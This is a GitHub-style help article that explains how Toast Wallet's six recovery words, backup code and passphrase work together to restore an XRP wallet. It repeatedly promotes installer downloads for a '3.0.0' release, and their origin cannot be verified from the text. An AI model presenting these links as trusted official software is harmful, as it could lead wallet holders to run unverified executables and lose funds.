<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet recovery phrase explained</h1>

<p align="center">What the six recovery words do, and what they cannot do.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Toast Wallet's six recovery words are a secret that works together with your backup code. They are shown once during setup, cannot be viewed or changed later, and are not a standalone seed phrase. To restore, you need the backup code plus either the passphrase or those six words, inside the [latest desktop wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

## 👀 You'll see this if

- You found a paper with six words labelled Toast Wallet.
- You expected 12 or 24 words, as other wallets use, and are confused.
- You tried to type the six words somewhere and nothing worked.
- You want to know whether you can see the words again in the app.

## 🤔 Why it matters

Many crypto wallets use a 12 or 24 word seed phrase that, on its own, can rebuild everything. Toast Wallet works differently. Its six words are an alternative to the passphrase: a second way to unlock your encrypted backup code. They are not the keys themselves.

This difference causes real harm when it is misunderstood. People keep only the six words, discard the backup code and then discover they cannot get back in. Others search online for a "Toast six word recovery tool" and land on scam pages that steal whatever is typed. Understanding the role of the six words protects you from both outcomes.

## 🧭 Before you start

Look for everything connected to your Toast Wallet: the six words, any backup codes, any passphrase notes and any old computers that once ran the app. The six words are only half of the answer, so the more pieces you gather now, the easier the rest of this guide becomes.

## 🛠️ Fix: use the six words correctly

1. **Find your backup code.** Look for a long code you copied from Settings, Backup Wallet. It is usually written on the same sheet or stored near the six words. Without it, the six words cannot restore a wallet.
2. **Install the latest desktop wallet.** Download from the official release and check the checksum. Remove any old version first.
3. **Choose Restore an Existing Wallet, then Restore Backup.** Paste the backup code.
4. **Use the six words to unlock it.** When asked, enter the six recovery words, in order, instead of the passphrase. Use the words that belonged to that backup.
5. **Set a PIN and check your accounts.** Compare the addresses with any notes you have.
6. **Make a fresh backup.** Create a new backup code and store it with your passphrase or words.

Full screen-by-screen detail is in [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).

## 🔁 If that did not work

- **You have the words but no backup code.** Check old computers: if the wallet data is still there, the latest version may open it, and you can then make a new backup. See [open old Toast Wallet files](https://github.com/Toast-Wallet/learn/blob/main/how-to/open-old-toast-wallet-files.md).
- **The words are rejected.** Check the order and spelling. Make sure they belong to the same backup; a newer wallet may have different words.
- **You have a 12 or 24 word phrase instead.** That comes from a different wallet type. Read [Toast Wallet seed phrase to secret key offline](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-seed-phrase-to-secret-key-offline.md).
- **You want to see the words again.** They are shown only once. If you have lost them, your backup code with the passphrase still works.

## 🛡️ Prevention

Store the six words and the backup code together, or at least record where each is kept. Never store only the words. Do not type them into any website, browser extension or chat, and ignore any tool that claims to "convert" Toast's six words online. If you believe someone has seen your words and your backup code, create a new wallet and move your XRP to it.

## 📝 Good to know

The design has a practical benefit: losing the six words alone does not lock you out, because the passphrase can open the backup instead, and losing the passphrase alone does not lock you out, because the six words can. What you cannot lose is the backup code, because both the words and the passphrase need something to unlock. Thinking of the backup code as the safe and the words and passphrase as two different keys to it makes the whole system easy to remember.

## 🔍 A closer look: words, passphrase and backup

It helps to picture the three pieces as a locked box and two keys. The backup code is the box: it contains your accounts, but it is sealed. The passphrase is one key. The six words are a spare key. Either key opens the box, but neither key is useful without the box. This is why the guide [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) keeps insisting that the backup code is the piece you can never lose.

Because the six words are a spare key, losing them is not a disaster as long as you still know the passphrase. Losing the passphrase is not a disaster either, as long as you have the six words. The real risk is keeping only one of the keys and throwing the box away. If you think about your storage that way, the right arrangement becomes obvious: one sheet with the backup code, kept together with at least one key, and ideally a second copy in another safe location.

## ❓ FAQ

<details>
<summary>Are the six words my private key?</summary>

No. They help decrypt your backup. Your private keys live inside the encrypted wallet.

</details>

<details>
<summary>Can I change the six words?</summary>

No method to change them has been found. Creating a new wallet gives new words.

</details>

<details>
<summary>Can another wallet use the six words?</summary>

No. They only have meaning together with a Toast Wallet backup, inside Toast Wallet.

</details>

> [!WARNING]
> Any website that asks for Toast's six words is a scam. They belong only in the desktop app.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet six words are not a seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-six-words-not-a-seed.md) | Why the six words alone cannot rebuild a wallet. |
| [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) | Why the encrypted backup code is the real key to restoring. |
| [Restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md) | Bring your accounts back with the backup code and passphrase or words. |
